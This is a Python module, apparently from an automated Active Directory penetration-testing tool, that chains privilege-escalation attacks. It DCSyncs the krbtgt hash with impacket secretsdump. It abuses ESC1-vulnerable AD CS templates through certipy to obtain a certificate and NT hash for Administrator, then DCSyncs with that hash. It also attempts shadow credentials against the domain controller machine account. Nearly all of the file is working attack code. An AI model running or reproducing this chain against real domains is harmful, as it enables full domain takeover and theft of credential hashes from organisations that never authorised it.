"""Misconfiguration abuse.

Focuses on the highest-value, fully-automatable privilege escalation paths:
  * AD CS (ESC1-family) via certipy: request a cert as a privileged user,
    authenticate, then DCSync.
  * Shadow Credentials (msDS-KeyCredentialLink) when writable.
  * DCSync privilege test (are we already domain admin?).

Destructive/irreversible operations are gated behind --aggressive and never
touch systems in a way that could crash or lock them.
"""
from __future__ import annotations

from pathlib import Path

from .base import BaseModule


class AbuseModule(BaseModule):
    name = "misconfig_abuse"
    description = "Abuse AD CS, shadow credentials, and DACL misconfigurations"

    def run(self, workdir: Path) -> dict:
        auth = self._pick_auth()
        if not auth:
            self.log.warn("no credentials; skipping misconfiguration abuse")
            return {}
        domain, user, pwd, nth = auth

        self._dcsync_privilege_test(domain, user, pwd, nth)
        self._adcs_abuse(workdir, domain, user, pwd, nth)
        self._shadow_credentials(domain, user, pwd, nth)
        return {"domain_admin": self.state.domain_admin_achieved}

    def _pick_auth(self):
        creds = self.state.usable_credentials()
        if not creds:
            return None
        c = creds[0]
        return (c.domain or self.state.domain, c.username, c.password, c.nthash)

    def _dc(self) -> str | None:
        return (self.state.domain_controllers or [None])[0]

    # ------------------------------------------------------------------
    def _dcsync_privilege_test(self, domain, user, pwd, nth) -> None:
        """Test whether current creds already have DCSync (DA-equivalent)."""
        dc = self._dc()
        if not dc:
            return
        cmd = self.runner.resolve("secretsdump", prefix="impacket-")
        target = f"{domain}/{user}"
        args = [cmd, target, "@", dc, "-just-dc-user", "krbtgt"]
        if nth:
            args = [cmd, f"{domain}/{user}@{dc}", "-hashes", f"0x0:{nth}",
                    "-just-dc-user", "krbtgt"]
        else:
            args = [cmd, f"{domain}/{user}:{pwd}@{dc}", "-just-dc-user", "krbtgt"]
        res = self.runner.run(args, timeout=300, silent=True)
        if "krbtgt" in res.stdout and ":" in res.stdout:
            self.state.domain_admin_achieved = True
            self.log.ok("DCSync succeeded — domain admin privileges confirmed!")
            self.log_finding(
                "critical", "Domain Admin achieved via DCSync",
                f"{domain}\\{user} has DCSync rights",
                technique="DCSync")

    # ------------------------------------------------------------------
    def _adcs_abuse(self, workdir, domain, user, pwd, nth) -> None:
        """Attempt ESC1: request cert as Administrator from a vulnerable template."""
        if self.state.domain_admin_achieved:
            return
        dc = self._dc()
        if not dc:
            return
        # Re-run certipy find (also cached from enumeration) to get vulnerable CA+template
        cmd = self.certipy_bin()
        args = [cmd, "find", "-u", f"{user}@{domain}", "-dc-ip", dc,
                "-ldap-scheme", "ldap", "-vulnerable", "-stdout"]
        if nth:
            args += ["-hashes", nth]
        else:
            args += ["-p", pwd or ""]
        res = self.runner.run(args, timeout=300, silent=True)
        text = res.stdout

        if "ESC1" not in text:
            self.log.debug("no ESC1-vulnerable template found")
            return

        # Parse CA name and template name from certipy output
        ca_name = _extract(text, r"CA Name\s*:\s*([^\n]+)")
        template = _extract(text, r"Template Name\s*:\s*([^\n]+)")
        target_host = _extract(text, r"CA Name\s*:\s*([^\n]+)")  # placeholder
        if not template:
            self.log.debug("could not parse vulnerable template name")
            return

        self.log.info("attempting ESC1 via template '%s'", template)
        pfx = workdir / "esc1_administrator.pfx"
        req = [cmd, "req", "-u", f"{user}@{domain}", "-dc-ip", dc,
               "-ldap-scheme", "ldap",
               "-ca", ca_name or "ca", "-template", template,
               "-upn", f"Administrator@{domain}", "-out", str(pfx)]
        if nth:
            req += ["-hashes", nth]
        else:
            req += ["-p", pwd or ""]
        res = self.runner.run(req, timeout=300, silent=True)
        if not pfx.exists():
            self.log.debug("ESC1 certificate request failed")
            return

        # Authenticate with the cert to obtain the Administrator NT hash
        auth_cmd = [cmd, "auth", "-pfx", str(pfx), "-dc-ip", dc]
        res = self.runner.run(auth_cmd, timeout=300, silent=True)
        nth_admin = _extract_admin_hash(res.stdout)
        if nth_admin:
            self.state.add_credential(
                username="Administrator", nthash=nth_admin, domain=domain,
                source="ADCS-ESC1")
            self.log_finding(
                "critical", "Escalated via AD CS ESC1",
                f"Obtained Administrator NT hash: {nth_admin}",
                technique="ESC1")
            # Now DCSync with the admin hash
            self._dcsync_with_hash(domain, nth_admin)
        else:
            # Fall back: certipy auth produced a TGT; try DCSync via the ticket
            self.log.debug("no NT hash from certipy auth; will rely on TGT "
                           "if KRB5CCNAME is set")

    def _dcsync_with_hash(self, domain: str, nthash: str) -> None:
        dc = self._dc()
        if not dc:
            return
        cmd = self.runner.resolve("secretsdump", prefix="impacket-")
        res = self.runner.run(
            [cmd, f"{domain}/Administrator@{dc}", "-hashes", f"0x0:{nthash}",
             "-just-dc-user", "krbtgt"],
            timeout=300, silent=True)
        if "krbtgt" in res.stdout and ":" in res.stdout:
            self.state.domain_admin_achieved = True
            self.log.ok("DCSync via ESC1 hash successful — DA achieved!")
            self.log_finding("critical", "Domain Admin achieved (ESC1 → DCSync)",
                             technique="DCSync")

    # ------------------------------------------------------------------
    def _shadow_credentials(self, domain, user, pwd, nth) -> None:
        """Opportunistically attempt shadow credentials on the DC machine account.

        Only makes sense when we have write rights over the target; this is a
        best-effort attempt that fails cleanly when rights are absent.
        """
        if self.state.domain_admin_achieved:
            return
        dc = self._dc()
        if not dc:
            return
        # Target the DC machine account if we suspect any write path
        dc_machine = self.state.meta.get("dc_machine_account")
        if not dc_machine:
            host = self.state.get_host(dc) if dc in self.state.hosts else None
            dc_machine = (host.hostname or dc).split(".")[0]
        cmd = self.certipy_bin()
        args = [cmd, "shadow", "auto", "-u", f"{user}@{domain}",
                "-account", dc_machine, "-dc-ip", dc,
                "-ldap-scheme", "ldap"]
        if nth:
            args += ["-hashes", nth]
        else:
            args += ["-p", pwd or ""]
        res = self.runner.run(args, timeout=300, silent=True)
        nth_dc = _extract_admin_hash(res.stdout)
        if nth_dc:
            self.state.add_credential(
                username=f"{dc_machine}$", nthash=nth_dc, domain=domain,
                source="shadow-credentials")
            self.log_finding(
                "critical", "Shadow credentials on DC machine account",
                f"Recovered {dc_machine}$ NT hash",
                technique="Shadow Credentials")


def _extract(text: str, pattern: str) -> str | None:
    import re
    m = re.search(pattern, text)
    return m.group(1).strip() if m else None


def _extract_admin_hash(text: str) -> str | None:
    """Parse an NT hash out of certipy output ('Got hash for ...: lm:nt')."""
    import re
    m = re.search(
        r"Got hash for '[^']+':\s*(?:[0-9a-fA-F]{32}:)?([0-9a-fA-F]{32})",
        text)
    if m:
        return m.group(1)
    # Fallback: first standalone 32-hex NT hash in the output
    m = re.search(r"(?<![0-9a-fA-F])([0-9a-fA-F]{32})(?![0-9a-fA-F])", text)
    return m.group(1) if m else None
